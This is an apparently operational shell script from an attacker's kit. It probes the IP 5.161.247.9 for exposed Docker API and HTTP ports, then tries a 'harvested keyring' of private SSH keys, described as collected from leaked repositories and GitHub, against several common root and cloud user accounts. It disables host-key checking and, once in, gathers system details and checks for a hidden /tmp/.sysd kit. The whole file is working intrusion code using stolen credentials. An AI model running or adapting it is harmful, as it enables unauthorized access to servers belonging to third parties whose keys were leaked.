#!/bin/sh
# What is 5.161.247.9 (a.k.a. "box2"), and does *any* key we hold open it?
#
# The kit key was rejected there since 20 Oct, but box1 holds a harvested keyring
# (.hunt/keys - collected by hunt.sh from leaked repos / GitHub) and its own
# provider keys. A box the owner provisioned trusts the owner's key, which is
# usually published on their GitHub - i.e. quite possibly already in our keyring.
ip=${1:-5.161.247.9}
W=${HUNT_WORK:-/tmp/.sysd/.hunt}

echo "== http surface"
for p in 2375 2376 4243 80 443 8080 9000; do
    code=$(curl -sS -o /dev/null -w '%{http_code}' -m 4 "http://$ip:$p/version" 2>/dev/null) || code="no"
    echo "  $p: $code"
done

echo "== ssh reachability + auth methods"
timeout 8 ssh -n -o BatchMode=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
    -o IdentitiesOnly=yes -o ConnectTimeout=5 root@"$ip" true 2>&1 | sed -e 's/^/  /' | tail -3

echo "== keys we can try"
: > /tmp/k.lst
n=0
for k in "$W"/keys/* "$HOME"/.ssh/id_* /tmp/.sysd/id_key ./id_key; do
    [ -f "$k" ] || continue
    fp=$(ssh-keygen -l -f "$k" 2>/dev/null | cut -c1-46) || continue
    n=$((n + 1))
    printf '%s\t%s\n' "$k" "$fp" >> /tmp/k.lst
done
echo "  $n key file(s) here"
head -6 /tmp/k.lst | sed -e 's/^/    /'

echo "== trying each against box2: -n so ssh cannot eat the key list"
hit=""
while read -r k fp; do
    [ -f "$k" ] || continue
    for u in root ubuntu admin ec2-user debian; do
        if timeout 8 ssh -n -i "$k" -o BatchMode=yes -o StrictHostKeyChecking=no \
               -o UserKnownHostsFile=/dev/null -o IdentitiesOnly=yes \
               -o ConnectTimeout=3 "$u@$ip" true 2>/dev/null; then
            echo "  OPEN  $u@$ip  <= $k  [$fp]"
            [ -n "$hit" ] || hit="$u|$k"
        fi
    done
done < /tmp/k.lst
[ -n "$hit" ] || echo "  no key opened it"

echo "== if we got in: what is it"
u=${hit%%|*}; k=${hit#*|}
if [ -n "$u" ] && [ -n "$k" ]; then
    timeout 20 ssh -n -i "$k" -o BatchMode=yes -o StrictHostKeyChecking=no \
        -o UserKnownHostsFile=/dev/null -o IdentitiesOnly=yes "$u@$ip" \
        'uname -a; echo ---; head -3 /etc/os-release 2>/dev/null; echo ---; nproc; free -m 2>/dev/null | head -2; echo ---; systemctl is-active docker 2>/dev/null; docker ps 2>/dev/null | head -4; echo ---; ls -d /tmp/.sysd 2>/dev/null || echo no-kit' 2>/dev/null
fi

